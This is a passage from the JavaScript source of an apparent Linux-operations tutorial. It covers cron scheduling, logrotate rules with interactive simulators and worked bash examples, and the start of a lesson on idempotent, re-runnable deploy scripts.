df -h / > "$REPORT_DIR/disk-$(date -u +%Y%m%dT%H%M).txt"
echo "$(date -u +%FT%TZ) done"`],
    codeTitle: ['A cron-proof job: own PATH, own folder, config file, lock and log'],
    viz: [{
      title: 'When does this cron line fire?',
      input: '*/15 2-3 * * 1-5',
      inputLabel: 'five cron fields: minute hour day-of-month month day-of-week',
      gen: function (input) {
        var fields = String(input || '').trim().split(/\s+/);
        if (fields.length !== 5) throw new Error('Give exactly 5 fields, e.g. */15 2-3 * * 1-5');
        var spec = [['minute', 0, 59], ['hour', 0, 23], ['day of month', 1, 31], ['month', 1, 12], ['day of week', 0, 7]];
        function parse(txt, lo, hi, name) {
          var set = {};
          txt.split(',').forEach(function (item) {
            var m = item.match(/^(\*|\d+(?:-\d+)?)(?:\/(\d+))?$/);
            if (!m) throw new Error('Cannot read "' + item + '" in the ' + name + ' field (use *, 5, 1-5, */15, 1,15)');
            var a = lo, b = hi, step = m[2] ? Number(m[2]) : 1;
            if (m[1] !== '*') { var r = m[1].split('-'); a = Number(r[0]); b = r.length > 1 ? Number(r[1]) : (m[2] ? hi : a); }
            if (a < lo || b > hi || a > b || step < 1) throw new Error(name + ' must be within ' + lo + '-' + hi);
            for (var v = a; v <= b; v += step) set[v] = true;
          });
          if (name === 'day of week' && set[7]) set[0] = true;
          return set;
        }
        var sets = fields.map(function (t, i) { return parse(t, spec[i][1], spec[i][2], spec[i][0]); });
        var domStar = fields[2] === '*', dowStar = fields[4] === '*';
        var DAYS = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
        function list(s, lo, hi) { var o = []; for (var v = lo; v <= hi; v++) if (s[v]) o.push(String(v)); return o.length > 14 ? o.slice(0, 6).concat(['...', o[o.length - 1]]) : o; }
        var f = [];
        f.push({ narr: 'A cron line has five time fields. Cron checks them <b>once a minute</b>: if the current minute matches all of them, the command runs. Our line: <code>' + H.esc(fields.join(' ')) + '</code>.', parts: [
          { type: 'table', label: 'the five fields', columns: ['field', 'you wrote', 'allowed'], rows: spec.map(function (s, i) { return [s[0], fields[i], s[1] + '-' + s[2]]; }) }
        ] });
        [0, 1].forEach(function (i) {
          f.push({ narr: 'The <b>' + spec[i][0] + '</b> field <code>' + H.esc(fields[i]) + '</code> allows these values. ' + (fields[i] === '*' ? '<code>*</code> means "every".' : /\//.test(fields[i]) ? '<code>/N</code> is a step: every N-th value in the range.' : ''), parts: [{ type: 'set', label: spec[i][0] + ' values', items: list(sets[i], spec[i][1], spec[i][2]) }] });
        });
        f.push({ narr: 'Day fields: day of month <code>' + H.esc(fields[2]) + '</code>, month <code>' + H.esc(fields[3]) + '</code>, day of week <code>' + H.esc(fields[4]) + '</code>. ' + (!domStar && !dowStar ? H.c('y', 'Gotcha: both day fields are restricted, so cron runs when EITHER matches (day of month OR day of week), not both.') : 'Only one day field is restricted, so it simply has to match.'), parts: [
          { type: 'set', label: 'day of week values', items: list(sets[4], 0, 6).map(function (v) { return isNaN(v) ? v : DAYS[Number(v)]; }) },
          { type: 'set', label: 'day of month values', items: list(sets[2], 1, 31) }
        ] });
        var t = Date.UTC(2026, 2, 6, 22, 0), tEnd = t + 62 * 86400000, runs = [], tries = 0;
        while (runs.length < 6 && t < tEnd && tries < 20000) {
          var d = new Date(t);
          var mi = d.getUTCMinutes(), h = d.getUTCHours(), dom = d.getUTCDate(), mo = d.getUTCMonth() + 1, dw = d.getUTCDay();
          var dayOk = (domStar || dowStar) ? (sets[2][dom] && sets[4][dw]) : (sets[2][dom] || sets[4][dw]);
          tries++;
          if (!sets[3][mo] || !dayOk) { t = Date.UTC(d.getUTCFullYear(), d.getUTCMonth(), dom + 1); continue; }   // skip the rest of the day
          if (!sets[1][h]) { t = Date.UTC(d.getUTCFullYear(), d.getUTCMonth(), dom, h + 1); continue; }           // skip the rest of the hour
          if (sets[0][mi]) runs.push(d);
          t += 60000;
        }
        function fmt(d) { function p(n) { return (n < 10 ? '0' : '') + n; } return DAYS[d.getUTCDay()] + ' ' + d.getUTCFullYear() + '-' + p(d.getUTCMonth() + 1) + '-' + p(d.getUTCDate()) + ' ' + p(d.getUTCHours()) + ':' + p(d.getUTCMinutes()) + ' UTC'; }
        f.push({ narr: 'Starting from <b>Friday 2026-03-06 22:00 UTC</b>, cron walks forward minute by minute. ' + (runs.length ? 'The next ' + runs.length + ' run(s):' : H.c('r', 'No match within two months: check the fields (for example 31 in a month that never has a 31st).')), parts: [
          { type: 'table', label: 'next runs (server time zone = UTC)', columns: ['#', 'runs at'], rows: runs.map(function (d, i) { return [String(i + 1), fmt(d)]; }), hl: { 0: 'ok' } }
        ] });
        f.push({ narr: 'Remember three things: times are in the <b>server\'s</b> zone (usually UTC); <code>* * * * *</code> means every minute, so <code>* 2 * * *</code> runs <b>60 times</b> between 02:00 and 02:59 (you wanted <code>0 2 * * *</code>); and a job that takes longer than its interval will overlap itself unless you use <code>flock</code>.', parts: [
          { type: 'table', label: 'common lines', columns: ['line', 'meaning'], rows: [['0 2 * * *', 'daily at 02:00'], ['* 2 * * *', 'every minute from 02:00 to 02:59 (a mistake)'], ['*/5 * * * *', 'every 5 minutes'], ['0 9 * * 1-5', '09:00 on weekdays'], ['0 0 1 * *', 'midnight on the 1st of each month']], hl: { 1: 'bad' } }
        ] });
        return f;
      }
    }, {
      title: 'Log rotation night by night',
      input: '3 5',
      inputLabel: 'rotate COUNT, then number of nights (1-8)',
      gen: function (input) {
        var m = String(input || '').trim().match(/^(\d+)\s+(\d+)$/);
        if (!m) throw new Error('Give two numbers: rotate count and nights, e.g. 3 5');
        var keep = Number(m[1]), nights = Number(m[2]);
        if (keep < 1 || keep > 6 || nights < 1 || nights > 8) throw new Error('rotate 1-6, nights 1-8');
        var files = [{ n: 'app.log', d: 1 }], f = [];
        function show(hl) { return { type: 'array', label: 'files in /var/log/app (content from day N)', values: files.map(function (x) { return x.n + ' (d' + x.d + ')'; }), hl: hl || {} }; }
        f.push({ narr: 'Config: <code>daily, rotate ' + keep + ', compress, delaycompress, missingok, notifempty</code>. On day 1 the app writes into <code>app.log</code>. logrotate runs once a night (around midnight to 06:00, depending on the distro).', parts: [show({ 0: 'cur' }), { type: 'code', label: '/etc/logrotate.d/app', lang: 'text', code: '/var/log/app/app.log {\n    daily\n    rotate ' + keep + '\n    compress\n    delaycompress\n    missingok\n    notifempty\n    create 0640 app adm\n    postrotate\n        systemctl reload app\n    endscript\n}' }] });
        for (var night = 1; night <= nights; night++) {
          var dropped = null;
          var old = files.filter(function (x) { return x.n !== 'app.log'; });
          old.forEach(function (x) { x.k = Number(x.n.split('.')[2]) + 1; });
          old = old.filter(function (x) { if (x.k > keep) { dropped = x; return false; } return true; });
          var cur = files.filter(function (x) { return x.n === 'app.log'; })[0];
          old.forEach(function (x) { x.n = 'app.log.' + x.k + (x.k >= 2 ? '.gz' : ''); });
          var newOld = { n: 'app.log.1', d: cur.d, k: 1 };
          files = [{ n: 'app.log', d: night + 1 }, newOld].concat(old).sort(function (a, b) { return (a.k || 0) - (b.k || 0); });
          var hl = { 0: 'ok', 1: 'cur' };
          f.push({ narr: '<b>Night ' + night + '</b>: each old file moves up one number' + (old.length ? ' (and <code>delaycompress</code> means app.log.1 is gzipped only when it becomes app.log.2)' : '') + '. <code>app.log</code> becomes <code>app.log.1</code>, a fresh empty <code>app.log</code> is created, and <code>postrotate</code> reloads the app so it writes to the new file. ' + (dropped ? H.c('r', 'The oldest file (day ' + dropped.d + ') passed rotate ' + keep + ' and is deleted.') : 'Nothing is old enough to delete yet.'), parts: [show(hl)] });
        }
        if (f.length < 3) f.push({ narr: 'One more night would move app.log.1 to app.log.2.gz (compressed now, thanks to delaycompress waiting one cycle). Raise the number of nights to watch old files fall off the end.', parts: [show({ 1: 'cur' })] });
        f.push({ narr: 'From now on the folder never holds more than <b>' + (keep + 1) + '</b> files: today\'s log plus ' + keep + ' old ones. Disk use is bounded, which is the whole point. To check a rule without waiting a night: <code>sudo logrotate -d /etc/logrotate.d/app</code> (dry run) or <code>-f</code> (force now).', parts: [show({ 0: 'sel' })] });
        return f;
      }
    }],
    examples: [
      { title: 'Reproduce cron\'s environment before you blame cron', html: `<p>A ticket says "the job works by hand". Run it the way cron does: an almost empty environment, <code>/bin/sh</code>, starting in home. <code>env -i</code> starts with no variables at all. If it fails here, you see the real error in seconds instead of waiting for the next scheduled run. Typical result: ${H.c('r', 'aws: not found')} (exit 127), because <code>aws</code> lives in <code>/usr/local/bin</code>.</p>`, code: B`# What cron really gives you: add this line to crontab -e for one minute, then remove it
# * * * * * env > /tmp/cron-env.txt
cat /tmp/cron-env.txt
# HOME=/home/deploy
# LOGNAME=deploy
# PATH=/usr/bin:/bin
# SHELL=/bin/sh

# Re-run the job by hand with that same environment
cd ~ && env -i HOME="$HOME" LOGNAME="$USER" PATH=/usr/bin:/bin SHELL=/bin/sh \
  /bin/sh -c '/opt/scripts/backup.sh' ; echo "exit code: $?"

# Then read what cron itself logged
journalctl -u cron --since "1 hour ago" | tail -n 20       # Ubuntu / Debian
# sudo tail -n 20 /var/log/cron                            # RHEL / Amazon Linux` },
      { title: 'The percent sign that broke a cron line', html: `<p>This line worked in the terminal and silently did nothing from cron: <code>0 1 * * * tar czf /backup/etc-$(date +%F).tgz /etc</code>. In a crontab, <code>%</code> means "newline, and send the rest as stdin". Cron ran <code>tar czf /backup/etc-$(date +</code> and failed. Escape it as <code>\\%</code>, or better, move the command into a script where <code>%</code> is just a character.</p>`, code: B`# crontab -e
# Broken: cron cuts the command at the first %
# 0 1 * * * tar czf /backup/etc-$(date +%F).tgz /etc
# Works: escaped
# 0 1 * * * tar czf /backup/etc-$(date +\%F).tgz /etc >> /var/log/etc-backup.log 2>&1
# Best: a script, so the cron line stays simple
# 0 1 * * * /opt/scripts/etc-backup.sh >> /var/log/etc-backup.log 2>&1

# /opt/scripts/etc-backup.sh
#!/usr/bin/env bash
set -euo pipefail
tar czf "/backup/etc-$(date -u +%F).tgz" /etc` },
      { title: 'A logrotate rule for an app, tested without waiting a night', html: `<p>An app writes <code>/var/log/myapp/*.log</code> and reopens its log files on <code>SIGHUP</code> (many daemons do; check the docs). The rule keeps 14 days, compresses, and tells the app to reopen. <code>-d</code> shows the plan without touching anything; <code>-f</code> forces a real rotation so you can check that the app keeps logging into the new file.</p>`, code: B`sudo tee /etc/logrotate.d/myapp > /dev/null <<'EOF'
/var/log/myapp/*.log {
    daily
    rotate 14
    compress
    delaycompress
    missingok
    notifempty
    create 0640 myapp adm
    sharedscripts
    postrotate
        systemctl kill --signal=HUP myapp.service 2>/dev/null || true
    endscript
}
EOF
sudo logrotate -d /etc/logrotate.d/myapp      # dry run: prints what would happen
sudo logrotate -f /etc/logrotate.d/myapp      # rotate now
ls -l /var/log/myapp/                         # app.log (new, small) and app.log.1
sleep 5; ls -l /var/log/myapp/app.log         # still growing? then the app reopened it` },
      { title: 'Rotation by hand, for when logrotate is not available', html: `<p>Inside a minimal container or on a box you do not administer, you can rotate with a small function. This self-contained demo runs four "days" with <code>keep=3</code>: the newest three old logs remain, compressed, and day 1 is gone. It uses the <b>copytruncate</b> style (copy, then empty in place), so a writer holding the file open keeps working.</p>`, code: B`#!/usr/bin/env bash
set -euo pipefail
rotate() {                                   # rotate LOG KEEP
  local log="$1" keep="$2" i
  [[ -s $log ]] || return 0                  # empty or missing: nothing to do
  rm -f -- "$log.$keep.gz"                   # drop the oldest
  for (( i = keep - 1; i >= 1; i-- )); do
    if [[ -e $log.$i.gz ]]; then mv -f -- "$log.$i.gz" "$log.$(( i + 1 )).gz"; fi
  done
  cp -p -- "$log" "$log.1" && : > "$log"     # copytruncate
  gzip -f -- "$log.1"
}
cd "$(mktemp -d)"
for day in 1 2 3 4; do
  echo "log lines from day $day" > app.log
  rotate app.log 3
done
ls -1
for f in app.log.*.gz; do echo "$f: $(zcat "$f")"; done
# Output:
# app.log
# app.log.1.gz
# app.log.2.gz
# app.log.3.gz
# app.log.1.gz: log lines from day 4
# app.log.2.gz: log lines from day 3
# app.log.3.gz: log lines from day 2` }
    ],
    deepDive: `<p>🟣 <b>systemd timers, the modern alternative.</b> A <code>.timer</code> unit plus a <code>.service</code> unit does what a cron line does, with extras: logs go to the journal automatically (<code>journalctl -u backup.service</code>), <code>Persistent=true</code> runs a missed job after the machine was off, <code>RandomizedDelaySec=</code> spreads load across a fleet, the service gets a clean, defined environment, and <code>systemctl list-timers</code> shows the last and next run of every job. Example: <code>OnCalendar=*-*-* 02:30:00</code> with <code>Persistent=true</code>. On modern distros, logrotate itself runs from <code>logrotate.timer</code>. Cron is still everywhere and every interviewer expects you to know it, but for new jobs on systemd hosts, timers are often the better tool.</p>
      <p><b>Overlaps and locks.</b> If a job every 5 minutes sometimes takes 7, two copies run together, which can corrupt state or double-send emails. <code>flock -n /run/lock/job.lock /opt/scripts/job.sh</code> on the cron line, or <code>exec 9&gt;lockfile; flock -n 9 || exit 0</code> inside the script, guarantees one copy. The kernel releases the lock when the process dies, even by <code>kill -9</code>, so there is no stale lock file problem as there is with "create a .pid file" schemes.</p>
      <p><b>Monitoring cron jobs.</b> Cron does not tell anyone when a job <b>stops running</b> (deleted crontab, broken server, wrong time zone). A good pattern is a "dead man's switch": at the end of a successful run, the job pings a heartbeat URL or pushes a metric (a timestamp of last success). An alert fires if no ping arrives within the expected window. Output-by-mail (<code>MAILTO=</code>) only helps if mail actually works on the server, which on cloud VMs it usually does not.</p>
      <p><b>copytruncate vs create.</b> <code>create</code> (the default) renames the log and makes a new one; the app must reopen its file (signal or reload), or it keeps writing into the renamed file. <code>copytruncate</code> works with any app, but lines written between the copy and the truncate are lost, and the copy needs twice the disk briefly. Apps that log to stdout under systemd or Docker skip all this: the journal or the container runtime rotates for them (<code>SystemMaxUse=</code> in journald.conf, <code>--log-opt max-size</code> in Docker).</p>
      <p><b>Time zones and DST.</b> A job at <code>30 2 * * *</code> in a local time zone with daylight saving can run twice or not at all on the switch days. Keep servers on UTC and convert business times. cronie (RHEL family) supports <code>CRON_TZ=</code> per crontab; systemd timers accept a zone in <code>OnCalendar</code>.</p>`,
    aiEra: `<p>🤖 <b>What AI changes:</b> "write a cron expression for every weekday at 07:45 UTC" or "explain this crontab line" is a perfect question for an assistant, and so is "convert this cron job to a systemd timer". Generating a logrotate rule from a description of the app also works well. Always double-check the five fields against a tool such as <code>crontab.guru</code> or a dry run, because an off-by-one in the hour field means a job runs at the wrong time for months before anyone notices.</p>
      <p><b>Where it goes wrong:</b> assistants assume your interactive environment (relative paths, <code>aws</code> on PATH, a sourced profile), forget the <code>%</code> escaping rule, drop output with <code>&gt;/dev/null 2&gt;&amp;1</code> "to avoid cron emails", and never add a lock. They may also suggest storing credentials in the crontab line or in a world-readable env file. <b>Your job:</b> make the job reproducible with <code>env -i</code>, log its output, lock it, keep secrets in a root-only file or a secrets manager, and add a heartbeat so you learn when it silently stops.</p>`,
    problems: [P({
      t: 'The cron job that works by hand but not from cron', l: 'Medium', tags: ['cron', 'PATH', 'environment', 'flock'], co: ['AWS Support', 'Datadog'],
      s: `<p>A developer added this to their crontab to sync uploads to S3 every 10 minutes. It works perfectly when they type the command. From cron, nothing is ever synced, and there is no error anywhere.</p>
<pre>*/10 * * * * cd app && source .env && aws s3 sync uploads/ s3://acme-uploads/$(date +%Y/%m)/ > /dev/null 2>&1</pre>
<p>Explain every reason it fails under cron, then replace it with a script plus a cron line that works, logs what happened, cannot run twice at once, and keeps any credentials out of the crontab.</p>`,
      ex: `<p>After the fix, <code>/var/log/upload-sync.log</code> shows ${H.c('g', '2026-03-02T10:20:01Z sync start')} ... ${H.c('g', 'sync done (exit 0)')} every 10 minutes. If a sync takes 14 minutes, the next run logs ${H.c('y', 'previous sync still running, skipping')} instead of starting a second copy.</p>`,
      bw: `<p>Six problems hide in one line. (1) <code>%</code> is a newline in crontab, so the command is cut at <code>date +</code>. (2) <code>source</code> does not exist in <code>/bin/sh</code> (dash). (3) <code>cd app</code> is relative to home, which may not be where the developer thought. (4) <code>aws</code> is in <code>/usr/local/bin</code>, not on cron's PATH. (5) <code>&gt; /dev/null 2&gt;&amp;1</code> throws away the error that would explain all of this. (6) Nothing prevents two syncs overlapping.</p>`,
      bc: B`# crontab line as written by the developer (do not use)
# */10 * * * * cd app && source .env && aws s3 sync uploads/ s3://acme-uploads/$(date +%Y/%m)/ > /dev/null 2>&1`,
      q: ['The cron mail (once mail was set up) said <code>/bin/sh: 1: source: not found</code>. Why?', ['Cron runs commands with /bin/sh, which on Ubuntu is dash and has no <code>source</code> builtin', 'The .env file is missing', 'source needs sudo', 'Cron does not allow &amp;&amp;'], 0, 'Cron uses SHELL=/bin/sh by default. dash only knows the POSIX "." command. Putting the logic in a bash script with a #!/usr/bin/env bash line removes the whole class of problem.'],
      h: ['<p>Hint 1: reproduce first: <code>env -i HOME="$HOME" PATH=/usr/bin:/bin /bin/sh -c \'...\'</code> shows the failures without waiting for cron.</p>', '<p>Hint 2: move all logic into <code>/opt/scripts/upload-sync.sh</code> with a bash shebang, its own <code>PATH</code>, absolute paths, and strict mode. Config comes from a root-owned env file read with <code>.</code>; AWS access comes from the instance role, not keys in the file.</p>', '<p>Hint 3: the cron line becomes just the script, a log redirect and nothing else. Use <code>flock -n</code> inside the script and log a "skipping" line when the lock is taken.</p>'],
      a: `<p>Diagnose by reproducing with <code>env -i</code>, which shows "source: not found" and then "aws: not found". The fix moves everything into a bash script: explicit <code>PATH</code>, absolute <code>APP_DIR</code>, config loaded from <code>/etc/upload-sync.env</code> (mode 600, owned by the job's user, holding only names such as the bucket; credentials come from the instance role, so no keys exist to leak). <code>flock -n</code> skips a run while the previous one is busy. The date path is built inside the script, where <code>%</code> is harmless. The cron line only calls the script and appends stdout and stderr to a log, so the next failure is visible. Exit codes are preserved so a wrapper or heartbeat can alert on failure.</p>`,
      code: B`#!/usr/bin/env bash
# /opt/scripts/upload-sync.sh - sync app uploads to S3; safe to run from cron
# crontab -e (user: deploy):
#   */10 * * * * /opt/scripts/upload-sync.sh >> /var/log/upload-sync.log 2>&1
set -euo pipefail
export PATH=/usr/local/bin:/usr/bin:/bin           # aws CLI lives in /usr/local/bin

ENV_FILE=/etc/upload-sync.env                     # e.g. APP_DIR=/srv/app  BUCKET=s3://acme-uploads
[[ -r $ENV_FILE ]] || { echo "cannot read $ENV_FILE" >&2; exit 1; }
. "$ENV_FILE"                                     # "." works in every shell; no secrets in this file
APP_DIR="\${APP_DIR:?APP_DIR missing in $ENV_FILE}"
BUCKET="\${BUCKET:?BUCKET missing in $ENV_FILE}"

log() { printf '%s %s\n' "$(date -u +%FT%TZ)" "$*"; }

exec 9> /tmp/upload-sync.lock
if ! flock -n 9; then
  log "previous sync still running, skipping"
  exit 0
fi

cd "$APP_DIR"
prefix="$(date -u +%Y/%m)"
log "sync start: $APP_DIR/uploads -> $BUCKET/$prefix/"
rc=0
aws s3 sync --only-show-errors uploads/ "$BUCKET/$prefix/" || rc=$?
log "sync done (exit $rc)"
exit "$rc"`,
      cx: `<p>The script adds a lock and a few log lines: negligible. <code>aws s3 sync</code> only uploads changed files, so each run costs a listing plus the new uploads.</p>`,
      f: ['How would you be alerted if this job stopped running entirely (crontab deleted, server replaced)?', 'Rewrite the schedule as a systemd timer. What do you gain?']
    })]
  });

  // ───────────────────────── Topic 7: safe, idempotent scripts ─────────────────────────
  topics.push({
    title: 'Writing Safe, Idempotent Scripts: Deploys You Can Re-run Without Fear',
    analogy: `<p>An <b>idempotent</b> script is like a <b>light switch labelled "ON"</b>, not a button labelled "toggle". Press "ON" once or ten times: the light is on. Press "toggle" twice and you are back in the dark. Operations scripts get "pressed" more than once all the time: the CI job times out and retries, the SSH session drops halfway, a colleague runs it again "just to be sure". A safe script describes the <b>end state</b> ("this line is in the file", "release 1.4.2 is live") and does only the work needed to get there.</p>`,
    explain: `<p>🟢 <b>Why it matters.</b> A deploy script that appends a cron line, creates a user and adds a config line will, on its second run, add a <b>second</b> cron line (the job now runs twice), fail on "user already exists" (and with <code>set -e</code> stop halfway), and duplicate the config line. Re-running is the normal recovery step for automation, so it must be safe.</p>
      <p>🟢 <b>Idempotent versions of everyday actions:</b></p>
      ${H.table(['Goal', 'Not idempotent', 'Idempotent'], [
        ['folder exists', '<code>mkdir /srv/app</code> (fails 2nd time)', '<code>mkdir -p /srv/app</code>'],
        ['line in a file', '<code>echo "$l" &gt;&gt; f</code> (duplicates)', '<code>grep -qxF -- "$l" f || echo "$l" &gt;&gt; f</code>'],
        ['user exists', '<code>useradd app</code> (fails 2nd time)', '<code>id -u app &amp;&gt;/dev/null || useradd --system app</code>'],
        ['file with exact content and mode', '<code>cp</code> then <code>chmod</code>', '<code>install -m 0644 src dst</code> (sets mode in one step)'],
        ['symlink points at X', '<code>ln -s X link</code> (fails if it exists)', '<code>ln -sfn X link</code>'],
        ['service on and running', '<code>systemctl start app</code> at every boot by hand', '<code>systemctl enable --now app</code>'],
        ['package installed', 'download and run an installer', '<code>apt-get install -y pkg</code> (no-op if present)'],
        ['folder mirrors source', '<code>cp -r src/* dst/</code> (old files stay)', '<code>rsync -a --delete src/ dst/</code>']
      ])}
      <p>🔵 <b>Change only when needed, restart only when changed.</b> Write the new config to a temp file, compare with <code>cmp -s new current</code>, and only if different: validate it (<code>nginx -t</code>, <code>sshd -t</code>, <code>visudo -cf</code>), move it into place, and reload. A second run finds nothing to change and touches nothing, so it causes no needless restarts.</p>
      <p>🔵 <b>Atomic steps.</b> <code>mv</code> within one filesystem is <b>atomic</b>: other programs see the old file or the new one, never half of each. So build things beside their final place, then <code>mv</code> them in. For deploys, unpack each version into <code>releases/1.4.2/</code> and switch a symlink <code>current → releases/1.4.2</code>. Rollback is switching the link back.</p>
      <p>🔵 <b>Guard rails for anything destructive.</b> One run at a time (<code>flock</code>). A <code>--dry-run</code> mode that prints what would happen. Validate input before acting (a version must look like a version, a path must be inside the expected folder). Refuse to run as root unless needed. Ask for confirmation in a terminal, and require an explicit <code>--yes</code> in automation. Run <b>ShellCheck</b> in CI on every script.</p>`,
    clues: [
      '"the deploy failed halfway; is it safe to run again?" → design for re-runs: check state, then act; atomic switches; no duplicate appends',
      '"cron line / config line appears twice" → append without checking: <code>grep -qxF || echo &gt;&gt;</code>, or manage the whole file',
      '"zero-downtime switch" / "instant rollback" → releases folder plus atomic symlink swap (<code>ln -sfn</code> + <code>mv -T</code>)',
      '"service restarted for no reason on every run" → compare (<code>cmp -s</code>) and reload only when the file changed',
      '"two deploys ran at the same time" → <code>flock</code> around the script',
      '"bash script vs Ansible/Terraform" → once state logic grows (many hosts, many resources), use a tool built for desired state (Cloud &amp; DevOps 9 and 10)'
    ],
    code: [B`#!/usr/bin/env bash
# Lab: ensure.sh - small idempotent helpers. Run it twice: the second run changes nothing.
# Safe: everything happens inside a folder given by BASE (default: a new temp folder).
set -euo pipefail
BASE="\${BASE:-$(mktemp -d)}"

ensure_dir()  { [[ -d $1 ]] && return 0; mkdir -p -- "$1"; echo "created dir $1"; }

ensure_line() {                       # ensure_line FILE LINE
  local file="$1" line="$2"
  touch -- "$file"
  grep -qxF -- "$line" "$file" && return 0
  printf '%s\n' "$line" >> "$file"; echo "added line to $file"
}

ensure_file() {                       # ensure_file DEST MODE < content   (returns 0 if unchanged)
  local dest="$1" mode="$2" tmp
  tmp="$(mktemp "$(dirname "$dest")/.tmp.XXXXXX")"
  cat > "$tmp"
  if [[ -f $dest ]] && cmp -s -- "$tmp" "$dest"; then rm -f -- "$tmp"; return 0; fi
  chmod "$mode" -- "$tmp"
  mv -f -- "$tmp" "$dest"; echo "wrote $dest"
}

ensure_dir  "$BASE/etc/app"
ensure_line "$BASE/etc/hosts" "10.0.0.5 db.internal"
ensure_file "$BASE/etc/app/app.conf" 0640 <<'EOF'
listen = 127.0.0.1:8080
workers = 4
EOF
echo "state is correct in $BASE"
# First run output:              Second run (BASE=same folder) output:
# created dir .../etc/app        state is correct in ...
# added line to .../etc/hosts
# wrote .../etc/app/app.conf
# state is correct in ...`],
    codeTitle: ['ensure_dir, ensure_line and ensure_file: helpers that are safe to repeat'],
    viz: [{
      title: 'Release folders and an atomic symlink switch',
      input: 'v1 v2 v2 v3 v4 v2',
      inputLabel: 'deploys in order (keep = 3 releases)',
      gen: function (input) {
        var seq = String(input || '').trim().split(/\s+/).filter(Boolean);
        if (!seq.length || seq.length > 10) throw new Error('Give 1-10 versions, e.g. v1 v2 v2 v3');
        if (seq.some(function (v) { return !/^[\w.-]{1,12}$/.test(v); })) throw new Error('Versions are short names like v3 or 1.4.2');
        var KEEP = 3, releases = [], current = null, f = [];
        function parts(hl) { return [
          { type: 'array', label: 'releases/ (oldest → newest)', values: releases.length ? releases.slice() : ['(empty)'], hl: hl || {} },
          { type: 'vars', label: 'symlink', vals: { current: current ? 'releases/' + current : '(none)' }, hl: { current: 'sel' } }
        ]; }
        f.push({ narr: 'Layout on the server: each version lives in its own folder under <code>releases/</code>, and the web server serves <code>/srv/app/current</code>, a <b>symlink</b>. Switching versions means pointing the link somewhere else, which takes microseconds. We keep at most ' + KEEP + ' releases.', parts: parts() });
        seq.forEach(function (v) {
          if (current === v) {
            f.push({ narr: 'Deploy <b>' + H.esc(v) + '</b> again (maybe CI retried after a timeout). The script checks first: <code>current</code> already points at ' + H.esc(v) + ', so it prints "already current" and exits 0. ' + H.c('g', 'No restart, no downtime, no duplicate work.'), parts: parts(one(releases.indexOf(v), 'ok')) });
            return;
          }
          var existed = releases.indexOf(v) >= 0;
          if (!existed) {
            releases.push(v);
            f.push({ narr: 'Deploy <b>' + H.esc(v) + '</b>: unpack into a temp folder <code>releases/.tmp.XXXX</code>, then <code>mv</code> it to <code>releases/' + H.esc(v) + '</code>. Until that rename, nobody can see a half-copied release.', parts: parts(one(releases.length - 1, 'cur')) });
          }
          current = v;
          f.push({ narr: (existed ? '<b>' + H.esc(v) + '</b> is still on disk, so this is a <b>rollback</b>: nothing to unpack, only the switch. ' : '') + 'Switch: <code>ln -sfn releases/' + H.esc(v) + ' current.new</code> then <code>mv -T current.new current</code>. The rename replaces the old link in one step, so every request sees either the old or the new version.', parts: parts(one(releases.indexOf(v), 'ok')) });
          if (releases.length > KEEP) {
            var drop = releases.filter(function (r) { return r !== current; })[0];
            var di = releases.indexOf(drop);
            f.push({ narr: 'Prune: more than ' + KEEP + ' releases, so the oldest one that is <b>not current</b> (<b>' + H.esc(drop) + '</b>) is removed. Never delete the release the link points at, even if it is the oldest.', parts: parts(one(di, 'bad')) });
            releases.splice(di, 1);
          }
        });
        f.push({ narr: 'Final state: <code>current → releases/' + H.esc(current) + '</code>, releases on disk: ' + releases.map(H.esc).join(', ') + '. Running the same deploy again changes nothing. That is idempotence.', parts: parts(one(releases.indexOf(current), 'sel')) });
        return f;
      }
    }, {
      title: 'Append vs ensure: running a setup script three times',
      input: '3',
      inputLabel: 'how many times the setup script runs (1-6)',
      gen: function (input) {
        var n = Number(String(input || '').trim());
        if (!(n >= 1 && n <= 6) || n % 1) throw new Error('Give a whole number 1-6');
        var naive = [], safe = [], cron = [], f = [];
        var L = 'vm.swappiness = 10', C = '0 2 * * * /opt/scripts/backup.sh';
        f.push({ narr: 'A setup script adds a sysctl line and a cron line. Version A uses plain <code>echo ... &gt;&gt;</code>. Version B checks first with <code>grep -qxF -- "$line" file || echo "$line" &gt;&gt; file</code> (<code>-x</code> whole line, <code>-F</code> fixed text, <code>-q</code> quiet).', parts: [{ type: 'array', label: 'A: sysctl.conf', values: ['(empty)'] }, { type: 'array', label: 'B: sysctl.conf', values: ['(empty)'] }] });
        for (var r = 1; r <= n; r++) {
          naive.push(L); cron.push(C);
          var added = safe.indexOf(L) < 0; if (added) safe.push(L);
          f.push({ narr: '<b>Run ' + r + '</b>. A appends again: now ' + naive.length + ' copies of the line' + (r > 1 ? ', and ' + cron.length + ' identical cron lines, so the backup runs ' + cron.length + ' times every night' : '') + '. B: grep ' + (added ? 'finds nothing, so it appends once.' : 'finds the line (exit 0), so <code>||</code> skips the echo.'), parts: [
            { type: 'array', label: 'A: sysctl.conf', values: naive.slice(), hl: (function () { var h = {}; for (var i = 1; i < naive.length; i++) h[i] = 'bad'; return h; })() },
            { type: 'array', label: 'B: sysctl.conf', values: safe.slice(), hl: { 0: added ? 'ok' : 'done' } },
            { type: 'array', label: 'A: crontab', values: cron.slice(), hl: (function () { var h = {}; for (var i = 1; i < cron.length; i++) h[i] = 'bad'; return h; })() }
          ] });
        }
        if (n === 1) f.push({ narr: 'After one run, A and B look the same. The difference only shows on the <b>second</b> run, which is why "run it twice" is the basic idempotence test.', parts: f[f.length - 1].parts });
        f.push({ narr: 'After ' + n + ' run(s): A has ' + naive.length + ' copies, B has exactly <b>1</b>. For whole files, the even safer approach is to <b>own the file</b>: put your settings in <code>/etc/sysctl.d/90-app.conf</code> or <code>/etc/cron.d/app</code> and write the full content each time (compare, then replace). No grep needed, and removing a setting is just removing the file.', parts: [{ type: 'table', label: 'result', columns: ['version', 'lines after ' + n + ' runs'], rows: [['A (append)', String(naive.length)], ['B (ensure)', '1']], hl: { 0: n > 1 ? 'bad' : 'cur', 1: 'ok' } }] });
        return f;
      }
    }],
    examples: [
      { title: 'Three runs, one line', html: `<p>A bootstrap script appended a sysctl line on every run. After a few re-runs the file had a dozen copies; harmless here, but the same pattern added duplicate cron lines elsewhere and the backup ran four times a night. The <code>grep -qxF || echo</code> idiom makes it safe.</p>`, code: B`#!/usr/bin/env bash
set -euo pipefail
cd "$(mktemp -d)"
line='vm.swappiness = 10'
for run in 1 2 3; do echo "$line" >> naive.conf; done
for run in 1 2 3; do grep -qxF -- "$line" safe.conf 2>/dev/null || echo "$line" >> safe.conf; done
